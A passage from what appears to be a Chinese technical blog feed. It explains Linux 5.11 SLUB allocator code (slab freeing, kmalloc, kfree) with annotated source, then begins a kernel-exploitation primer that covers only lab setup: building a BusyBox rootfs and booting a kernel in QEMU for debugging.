class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __slab_free(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page,</span><br><span class="line">            <span class="type">void</span> *head, <span class="type">void</span> *tail, <span class="type">int</span> cnt,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *prior;</span><br><span class="line">    <span class="type">int</span> was_frozen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">    stat(s, FREE_SLOWPATH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kmem_cache_debug(s) &amp;&amp;</span><br><span class="line">        !free_debug_processing(s, page, head, tail, cnt, addr))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 一般此循环就走一次</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(n)) &#123;</span><br><span class="line">            spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">            n = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        prior = page-&gt;freelist;</span><br><span class="line">        counters = page-&gt;counters;</span><br><span class="line">        <span class="comment">// 插入 page-&gt;freelist 链表头</span></span><br><span class="line">        set_freepointer(s, tail, prior);</span><br><span class="line">        new.counters = counters;</span><br><span class="line">        was_frozen = new.frozen;</span><br><span class="line">        <span class="comment">// 计算释放后正在使用对象的数量</span></span><br><span class="line">        new.inuse -= cnt;</span><br><span class="line">        <span class="keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;</span><br><span class="line">            <span class="comment">// 如果页面为 empty slab 或此前为 full slab 且没有被绑定到 CPU</span></span><br><span class="line">            <span class="keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;</span><br><span class="line">                <span class="comment">// 如果开启 CONFIG_SLUB_CPU_PARTIAL 配置且此前为 full slab</span></span><br><span class="line">                <span class="comment">// 将其放入 cpu partial slab 中</span></span><br><span class="line">                new.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 否则放入 node slab 中</span></span><br><span class="line">                n = get_node(s, page_to_nid(page));</span><br><span class="line">                spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// page-&gt;freelist = head, page-&gt;counters = new.counters</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!cmpxchg_double_slab(s, page,</span><br><span class="line">        prior, counters,</span><br><span class="line">        head, new.counters,</span><br><span class="line">        <span class="string">&quot;__slab_free&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (likely(!n)) &#123;</span><br><span class="line">        <span class="comment">// 如果不放入 node slab 中</span></span><br><span class="line">        <span class="keyword">if</span> (likely(was_frozen)) &#123;</span><br><span class="line">            stat(s, FREE_FROZEN);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (new.frozen) &#123;</span><br><span class="line">            <span class="comment">// 放入 cpu partial slab 中</span></span><br><span class="line">            put_cpu_partial(s, page, <span class="number">1</span>);</span><br><span class="line">            stat(s, CPU_PARTIAL_FREE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接返回</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line">        <span class="comment">// 如果为 empty slab 且 node slab 足够多</span></span><br><span class="line">        <span class="comment">// 就跳转到 slab_empty，最终会释放给 Buddy System</span></span><br><span class="line">        <span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;</span><br><span class="line">        <span class="comment">// 如果没有开启 CONFIG_SLUB_CPU_PARTIAL 配置且此前为 full slab</span></span><br><span class="line">        <span class="comment">// 则放入 node slab 链表尾</span></span><br><span class="line">        remove_full(s, n, page);</span><br><span class="line">        add_partial(n, page, DEACTIVATE_TO_TAIL);</span><br><span class="line">        stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line">    <span class="keyword">if</span> (prior) &#123;</span><br><span class="line">        <span class="comment">// 如果之前有空闲对象，说明该 slab 在 node slab 上，移走</span></span><br><span class="line">        remove_partial(n, page);</span><br><span class="line">        stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则说明在 kmem_cache_node-&gt;full 链表上，移走</span></span><br><span class="line">        remove_full(s, n, page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">    stat(s, FREE_SLAB);</span><br><span class="line">    <span class="comment">// 归还给 Buddy System</span></span><br><span class="line">    discard_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>将被释放对象插入 <code>page-&gt;freelist</code> 中</li><li>计算释放后正在使用的对象数量</li><li>如果该 slab 释放前为 full slab，则绑定到 CPU，放入 cpu partial slab 中</li><li>如果该 slab 释放前为 full slab，且没有开启 CONFIG_SLUB_CPU_PARTIAL，则放入 node slab</li><li>如果该 slab 释放后为 empty slab 且 node slab 足够多，则释放给 Buddy System</li><li>其他情况表明该 slab 已经位于 cpu partial slab 或 node slab 中，保持不变</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>分配：<ol><li>首先从 <code>kmem_cache_cpu</code> 上的 cpu slab 取对象，若有则直接返回</li><li>若 cpu slab 已经无空闲对象了，该 slab 会被加入到 <code>kmem_cache_node-&gt;full</code> 链表</li><li>尝试从 <code>kmem_cache_cpu</code> 上的 cpu partial slab 链表上取 slab，并作为 cpu slab</li><li>若 cpu partial slab 链表为空，则从 <code>kmem_cache_node</code> 上的 node slab 取若干个 slab 放到 <code>kmem_cache_cpu</code> 的 cpu slab 和 cpu partial slab 上，然后再取出空闲对象返回</li><li>若 node slab 链表也空了，那就向 Buddy Bystem 请求分配新的页面，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li></ol></li><li>释放：<ul><li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slab，直接使用头插法插入当前 CPU slub 的 freelist</li><li>若被释放 object 属于 <code>kmem_cache_node</code> 的 node slab，直接使用头插法插入对应 slub 的 freelist</li><li>若被释放 object 属于 <code>kmem_cache_node</code> 的 full slab，则其会成为对应 slab 的 freelist 头节点，且该 slab 会从 full 链表迁移到 cpu partial slab（优先） 或 node slab</li></ul></li></ul><h2 id="Kmalloc"><a href="#Kmalloc" class="headerlink" title="Kmalloc"></a>Kmalloc</h2><p><code>kmalloc</code> 实际上属于 Slab 的最上层接口函数，但是它在使用时会根据情况直接调用 Buddy System 函数，因此单独拿出来写</p><h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a><code>kmalloc</code></h3><p><code>kmalloc</code> 是内核中常用的分配内存的函数</p><ul><li><code>size_t size</code>：申请的内存大小</li><li><code>gfp_t</code>：分配标志位</li></ul><figure class="highlight c"><figcaption><span>include/linux/slab.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line">        <span class="comment">// 如果大小在编译时已知</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">    <span class="comment">// 如果大小较大，调用 kmalloc_large，会直接向 Buddy System 申请内存</span></span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line">        <span class="comment">// 获取下标</span></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接从 kmalloc_caches 中获取对应的 kmem_cache</span></span><br><span class="line">        <span class="comment">// 最终会调用 slab_alloc_node 分配内存</span></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">                <span class="comment">// kmalloc_type 会根据分配标志获取对应的 kmem_cache 类型</span></span><br><span class="line">kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">flags, size);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 否则调用 __kmalloc 动态分配内存</span></span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>如果申请大小在编译时已知<ol><li>如果大小大于 <code>kmem_cache</code> 中对象的最大大小，则调用 <code>kmalloc_large</code> 直接向 Buddy System 申请整个页面</li><li>否则，调用 <code>kmalloc_index</code> 计算对应大小的下标</li><li>调用 <code>kmalloc_type</code> 获取对应的 <code>kmem_cache</code> 类型</li><li>通过来类型和下标在 <code>kmalloc_caches</code> 中获取对应的 <code>kmem_cache</code></li><li>调用 <code>kmem_cache_alloc_trace</code> 申请内存</li></ol></li><li>否则调用 <code>__kmalloc</code> 动态分配内存</li></ol><h3 id="kmalloc-1"><a href="#kmalloc-1" class="headerlink" title="__kmalloc"></a><code>__kmalloc</code></h3><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__kmalloc(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">    <span class="type">void</span> *ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">        <span class="comment">// 如果大小大于 kmem_cache 中对象的最大大小</span></span><br><span class="line">        <span class="comment">// 调用 kmalloc_large 直接向 Buddy System 申请整个页面</span></span><br><span class="line">        <span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先调用 kmalloc_slab 获取对应的 kmem_cache</span></span><br><span class="line">    s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 slab_alloc-&gt;slab_alloc_node 进行内存分配</span></span><br><span class="line">    ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">    trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">    ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>如果大小大于 <code>kmem_cache</code> 中对象的最大大小，则调用 <code>kmalloc_large</code> 直接向 Buddy System 申请整个页面</li><li>否则，调用 <code>kmalloc_slab</code> 获取对应的 <code>kmem_cache</code></li><li>调用 <code>slab_alloc-&gt;slab_alloc_node</code> 进行内存分配</li></ol><h3 id="kfree"><a href="#kfree" class="headerlink" title="kfree"></a>kfree</h3><ul><li><code>const void *x</code>：释放的内存首地址</li></ul><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line"></span><br><span class="line">    trace_kfree(_RET_IP_, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(x)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 x 转换为对应的 page 结构体地址</span></span><br><span class="line">    page = virt_to_head_page(x);</span><br><span class="line">    <span class="comment">// 检查是否是一张 slab</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;</span><br><span class="line">        <span class="comment">// 若不是，则为一整个页面，获取页面的阶</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> order = compound_order(page);</span><br><span class="line"></span><br><span class="line">        BUG_ON(!PageCompound(page));</span><br><span class="line">        kfree_hook(object);</span><br><span class="line">        mod_node_page_state(page_pgdat(page), NR_SLAB_UNRECLAIMABLE_B,</span><br><span class="line">                    -(PAGE_SIZE &lt;&lt; order));</span><br><span class="line">        <span class="comment">// 直接释放给 Buddy System</span></span><br><span class="line">        __free_pages(page, order);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若该页面是一张 slab，调用 slab_free-&gt;do_slab_free 进行内存释放</span></span><br><span class="line">    slab_free(page-&gt;slab_cache, page, object, <span class="literal">NULL</span>, <span class="number">1</span>, _RET_IP_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>将被释放的内存首地址转换为对应页面的第一个 page 结构体地址</li><li>检查该页面是否为一张 slab</li><li>若不是，则获取页面的阶，释放给 Buddy System</li><li>若是，则调用 <code>slab_free-&gt;do_slab_free</code> 进行内存释放</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">【OS.0x02】Linux 内核内存管理I - 页、区、节点</a></p><p><a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">【OS.0x03】Linux内核内存管理II - Buddy System</a></p><p><a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux Kernel 内存管理浅析 III - Slub Allocator</a></p><p><a href="https://blog.csdn.net/sinat_22338935/article/details/117287114">linux内存管理（一）-内存管理架构</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linux 5.11 内存管理&lt;/p&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://humoooor.cn/categories/Computer-Science/"/>
    
    
    <category term="Linux Kernel" scheme="https://humoooor.cn/tags/Linux-Kernel/"/>
    
    <category term="Memory Management" scheme="https://humoooor.cn/tags/Memory-Management/"/>
    
  </entry>
  
  <entry>
    <title>Kernel Pwn 入门</title>
    <link href="https://humoooor.cn/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/"/>
    <id>https://humoooor.cn/2023/08/20/Kernel%20Pwn%20%E5%85%A5%E9%97%A8/</id>
    <published>2023-08-20T00:53:00.000Z</published>
    <updated>2023-10-04T11:52:38.050Z</updated>
    
    <content type="html"><![CDATA[<p>本机环境为 Ubuntu 22.04 x86_64</p><p>首先感谢 a3gg 让我们避免入门 Kernel Pwn 路上的很多坑</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装一些依赖包"><a href="#安装一些依赖包" class="headerlink" title="安装一些依赖包"></a>安装一些依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt git fakeroot build-essential ncurses-dev xz-utils qemu-system-x86 flex libncurses5-dev libssl-dev bc bison libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev libelf-dev</span><br></pre></td></tr></table></figure><h3 id="获取内核镜像"><a href="#获取内核镜像" class="headerlink" title="获取内核镜像"></a>获取内核镜像</h3><p>内核镜像一般称为 bzImage</p><p>这里准备下载已编译内核镜像</p><ol><li>列出版本对应可下载内核镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux-image | grep 5.19.0</span><br></pre></td></tr></table></figure><ol start="2"><li>选一个看着顺眼的下载就行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-5.19.0-generic-41-generic</span><br></pre></td></tr></table></figure><ol start="3"><li>解压下载的 deb 文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X ./ linux-image-5.19.0-41-generic_5.19.0-41.42~22.04.1_amd64.deb</span><br></pre></td></tr></table></figure><p><code>./boot/vmlinuz-5.19.0-41-generic</code> 就是 bzImage 镜像文件</p><h3 id="使用-Busybox-构建文件系统"><a href="#使用-Busybox-构建文件系统" class="headerlink" title="使用 Busybox 构建文件系统"></a>使用 Busybox 构建文件系统</h3><h4 id="编译-Busybox"><a href="#编译-Busybox" class="headerlink" title="编译 Busybox"></a>编译 Busybox</h4><p>BusyBox 是一个集成了三百多个最常用 Linux 命令和工具的软件，包含了例如 ls、cat 和 echo 等一些简单的工具，Busybox 可以为内核提供一个基本的用户环境</p><ol><li>获取 Busybox 源码</li></ol><p>选择一个稳定版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2</span><br></pre></td></tr></table></figure><ol start="2"><li>编译</li></ol><p>进入配置页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>勾选 <code>Settings</code> –&gt; <code>Build static binary file (no shared file)</code>，这样不用单独配置 libc，然后退出</p><p>接下来编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><p>生成一个 <code>_install</code> 目录，用来构建磁盘镜像</p><h4 id="构建文件系统"><a href="#构建文件系统" class="headerlink" title="构建文件系统"></a>构建文件系统</h4><ol><li>初始化文件系统</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line"><span class="built_in">mkdir</span> -pv &#123;bin,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line"><span class="built_in">touch</span> ./etc/inittab</span><br><span class="line"><span class="built_in">mkdir</span> ./etc/init.d</span><br><span class="line"><span class="built_in">touch</span> ./etc/init.d/rcS</span><br><span class="line"><span class="built_in">chmod</span> +x ./etc/init.d/rcS</span><br></pre></td></tr></table></figure><ol start="2"><li>配置初始化脚本</li></ol><p>配置 <code>./etc/inttab</code>，写入下面内容，指定系统初始化脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS  </span><br><span class="line">::askfirst:/bin/ash  </span><br><span class="line">::ctrlaltdel:/sbin/reboot  </span><br><span class="line">::shutdown:/sbin/swapoff -a  </span><br><span class="line">::shutdown:/bin/umount -a -r  </span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure><p>配置 <code>./etc/init.d/rcS</code>，挂载各种文件系统</p><figure class="highlight bash"><figcaption><span>./etc/init.d/rcS</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure><ol start="3"><li>配置用户组</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:0:root:/root:/bin/sh&quot;</span> &gt; etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot;</span> &gt;&gt; etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:&quot;</span> &gt; etc/group</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ctf:x:1000:&quot;</span> &gt;&gt; etc/group</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;none /dev/pts devpts gid=5,mode=620 0 0&quot;</span> &gt; etc/fstab</span><br></pre></td></tr></table></figure><h4 id="打包文件系统为镜像文件"><a href="#打包文件系统为镜像文件" class="headerlink" title="打包文件系统为镜像文件"></a>打包文件系统为镜像文件</h4><p>在 <code>_install</code> 目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../../rootfs.cpio</span><br></pre></td></tr></table></figure><h4 id="在文件系统中添加或修改文件"><a href="#在文件系统中添加或修改文件" class="headerlink" title="在文件系统中添加或修改文件"></a>在文件系统中添加或修改文件</h4><p>可以直接向 <code>_install</code> 内添加修改，但会比较混乱，也可以解压文件系统镜像后再打包</p><ol><li>解压文件系统镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idv &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><p>向里面加入想要添加的文件即可</p><ol start="2"><li>重打包文件系统镜像</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../new_rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="使用-qemu-运行内核"><a href="#使用-qemu-运行内核" class="headerlink" title="使用 qemu 运行内核"></a>使用 qemu 运行内核</h3><p>将 bzImage 和 rootfs.cpio 放到同一个目录</p><p>编写启动脚本 boot.sh</p><figure class="highlight bash"><figcaption><span>boot.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot;</span> \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-nographic \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><p>部分参数说明如下：</p><ul><li><code>-m</code>：虚拟机内存大小</li><li><code>-kernel</code>：内存镜像路径</li><li><code>-initrd</code>：磁盘镜像路径</li><li><code>-append</code>：附加参数选项<ul><li><code>nokalsr</code>：关闭内核地址随机化，方便调试</li><li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code> 进程会默认以 <code>/etc/init.d/rcS</code> 作为启动脚本</li><li><code>loglevel=3</code> &amp; <code>quiet</code>：不输出 log</li><li><code>console=ttyS0</code>：指定终端为 <code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li></ul></li><li><code>-monitor</code>：将监视器重定向到主机设备 <code>/dev/null</code>，这里重定向至 null 主要是防止 CTF 中被人给偷了 qemu 拿 flag</li><li><code>-cpu</code>：设置 CPU 安全选项，在这里开启了 SMEP 保护</li><li><code>-s</code>：相当于 <code>-gdb tcp::1234</code> 的简写（也可以直接这么写），后续可以通过 gdb 连接本地端口进行调试</li></ul><p>接下来运行 boot.sh 即可成功运行</p><h2 id="了解-LKM"><a href="#了解-LKM" class="headerlink" title="了解 LKM"></a>了解 LKM</h2><p>虽然 Linux 